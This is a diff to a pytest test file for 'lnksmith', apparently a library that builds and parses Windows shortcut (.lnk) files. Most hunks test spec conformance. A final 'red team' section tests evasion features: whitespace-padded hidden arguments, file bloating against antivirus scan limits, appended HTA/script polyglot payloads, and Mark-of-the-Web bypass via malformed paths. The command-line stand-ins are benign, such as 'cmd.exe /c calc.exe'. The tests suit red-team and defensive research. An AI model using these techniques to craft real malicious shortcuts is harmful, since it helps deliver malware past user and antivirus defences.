@@ -4,7 +4,12 @@ import struct
 
 import pytest
 
-from lnksmith._constants import LINK_CLSID, SW_MAXIMIZED, SW_MINIMIZED, SW_SHOWNORMAL
+from lnksmith._constants import (
+    LINK_CLSID,
+    SW_SHOWMAXIMIZED,
+    SW_SHOWMINNOACTIVE,
+    SW_SHOWNORMAL,
+)
 from lnksmith.builder import build_lnk
 
 
@@ -102,7 +107,9 @@ class TestHotkeyBytes:
 class TestShowCommand:
     """Verify show command is packed correctly."""
 
-    @pytest.mark.parametrize("cmd", [SW_SHOWNORMAL, SW_MAXIMIZED, SW_MINIMIZED])
+    @pytest.mark.parametrize(
+        "cmd", [SW_SHOWNORMAL, SW_SHOWMAXIMIZED, SW_SHOWMINNOACTIVE]
+    )
     def test_show_command_encoding(self, cmd):
         data = build_lnk(target=r"C:\t.exe", show_command=cmd)
         assert struct.unpack_from("<I", data, 60)[0] == cmd
@@ -302,6 +309,54 @@ class TestFileAttributesParam:
         assert attrs == 0x06
 
 
+class TestFileAttributesReservedBits:
+    """Spec 2.1.2: FileAttributes bits 3 and 6 are reserved, MUST be zero."""
+
+    def test_reserved_bit3_warns(self):
+        import warnings
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            build_lnk(target=r"C:\t.exe", file_attributes=0x08)
+        assert any("reserved bits" in str(x.message) for x in w)
+
+    def test_reserved_bit6_warns(self):
+        import warnings
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            build_lnk(target=r"C:\t.exe", file_attributes=0x40)
+        assert any("reserved bits" in str(x.message) for x in w)
+
+    def test_valid_bits_no_warning(self):
+        import warnings
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            build_lnk(target=r"C:\t.exe", file_attributes=0x27)
+        assert not any("reserved bits" in str(x.message) for x in w)
+
+
+class TestHotkeyVkValidation:
+    """Spec 2.1.3: HotKey VK codes restricted to normative list."""
+
+    def test_nonspec_vk_warns(self):
+        import warnings
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            build_lnk(target=r"C:\t.exe", hotkey_vk=0x08, hotkey_mod=0x02)
+        assert any("normative VK code" in str(x.message) for x in w)
+
+    def test_spec_valid_vk_no_warning(self):
+        import warnings
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            build_lnk(target=r"C:\t.exe", hotkey_vk=0x43, hotkey_mod=0x02)
+        assert not any("normative VK code" in str(x.message) for x in w)
+
+
 class TestLinkFlagsParam:
     """GAP-7: Additional link_flags parameter in builder."""
 
@@ -417,3 +472,148 @@ class TestSpecialFolderDataBlockBuilder:
         info = parse_lnk(data)
         block = next(b for b in info.extra_blocks if b.signature == 0xA0000005)
         assert block.size == 16
+
+
+# ---- Red team enhancement tests ----
+
+
+class TestArgumentPadding:
+    """ZDI-CAN-25373: Whitespace padding hides args in Properties dialog."""
+
+    def test_pad_args_prepends_spaces(self):
+        from lnksmith.parser import parse_lnk
+
+        data = build_lnk(
+            target=r"C:\Windows\System32\cmd.exe",
+            arguments="/c calc.exe",
+            pad_args=300,
+        )
+        info = parse_lnk(data)
+        assert info.arguments.startswith(" " * 300)
+        assert info.arguments.endswith("/c calc.exe")
+        assert len(info.arguments) == 300 + len("/c calc.exe")
+
+    def test_pad_args_zero_no_change(self):
+        from lnksmith.parser import parse_lnk
+
+        data = build_lnk(target=r"C:\t.exe", arguments="--help", pad_args=0)
+        info = parse_lnk(data)
+        assert info.arguments == "--help"
+
+    def test_pad_args_sets_has_arguments_flag(self):
+        data = build_lnk(target=r"C:\t.exe", arguments="/c whoami", pad_args=500)
+        flags = struct.unpack_from("<I", data, 20)[0]
+        assert flags & 0x20  # HasArguments
+
+    def test_pad_args_without_arguments(self):
+        from lnksmith.parser import parse_lnk
+
+        data = build_lnk(target=r"C:\t.exe", pad_args=100)
+        info = parse_lnk(data)
+        # pad_args on empty string = just spaces
+        assert info.arguments == " " * 100
+
+
+class TestBinaryPadding:
+    """T1027.001: File bloating to bypass AV/sandbox scan limits."""
+
+    def test_pad_size_inflates_file(self):
+        baseline = build_lnk(target=r"C:\t.exe")
+        padded = build_lnk(target=r"C:\t.exe", pad_size=1024)
+        assert len(padded) == len(baseline) + 1024
+
+    def test_pad_size_appends_null_bytes(self):
+        data = build_lnk(target=r"C:\t.exe", pad_size=256)
+        # The last 256 bytes should be null (before any append_data)
+        assert data[-256:] == b"\x00" * 256
+
+    def test_pad_size_zero_no_change(self):
+        baseline = build_lnk(target=r"C:\t.exe")
+        unpadded = build_lnk(target=r"C:\t.exe", pad_size=0)
+        assert len(baseline) == len(unpadded)
+
+    def test_padded_file_still_parseable(self):
+        from lnksmith.parser import parse_lnk
+
+        data = build_lnk(target=r"C:\Windows\notepad.exe", pad_size=4096)
+        info = parse_lnk(data)
+        assert info.target_path == r"C:\Windows\notepad.exe"
+
+
+class TestPayloadAppend:
+    """LNK/HTA polyglot: arbitrary data after terminal block."""
+
+    def test_append_data_present(self):
+        payload = b"<html><body>HTA content</body></html>"
+        data = build_lnk(target=r"C:\t.exe", append_data=payload)
+        assert data.endswith(payload)
+
+    def test_append_data_after_padding(self):
+        payload = b"PAYLOAD_MARKER"
+        data = build_lnk(target=r"C:\t.exe", pad_size=100, append_data=payload)
+        # Payload is at the very end, after padding
+        assert data.endswith(payload)
+        # Padding is before payload
+        pad_start = len(data) - len(payload) - 100
+        assert data[pad_start : pad_start + 100] == b"\x00" * 100
+
+    def test_append_empty_no_size_change(self):
+        baseline = build_lnk(target=r"C:\t.exe")
+        with_empty = build_lnk(target=r"C:\t.exe", append_data=b"")
+        assert len(baseline) == len(with_empty)
+
+    def test_appended_file_still_parseable(self):
+        from lnksmith.parser import parse_lnk
+
+        payload = b"<script>alert(1)</script>" * 100
+        data = build_lnk(target=r"C:\Windows\notepad.exe", append_data=payload)
+        info = parse_lnk(data)
+        assert info.target_path == r"C:\Windows\notepad.exe"
+
+
+class TestStompMotW:
+    """CVE-2024-38217: MotW bypass via malformed IDList paths."""
+
+    def test_stomp_dot_appends_period(self):
+        data = build_lnk(
+            target=r"C:\Windows\System32\powershell.exe",
+            stomp_motw="dot",
+        )
+        # The IDList should contain the dotted filename
+        assert b"powershell.exe." in data
+
+    def test_stomp_dot_with_short_names(self):
+        data = build_lnk(
+            target=[
+                "C",
+                ("WINDOW~1", "Windows"),
+                ("SYSTEM~1", "System32"),
+                "cmd.exe",
+            ],
+            stomp_motw="dot",
+        )
+        # Both short and long names get the dot
+        assert b"cmd.exe." in data
+
+    def test_stomp_relative_minimal_idlist(self):
+        data = build_lnk(
+            target=r"C:\Windows\System32\cmd.exe",
+            stomp_motw="relative",
+        )
+        # Should NOT contain root/drive items but should have the filename
+        assert b"cmd.exe" in data
+
+    def test_stomp_invalid_value_raises(self):
+        with pytest.raises(ValueError, match="Invalid stomp_motw"):
+            build_lnk(target=r"C:\t.exe", stomp_motw="invalid")
+
+    def test_stomp_dot_still_has_linkinfo(self):
+        from lnksmith.parser import parse_lnk
+
+        data = build_lnk(
+            target=r"C:\Windows\notepad.exe",
+            stomp_motw="dot",
+        )
+        info = parse_lnk(data)
+        # LinkInfo should still have the correct (non-stomped) path
+        assert info.target_path == r"C:\Windows\notepad.exe"
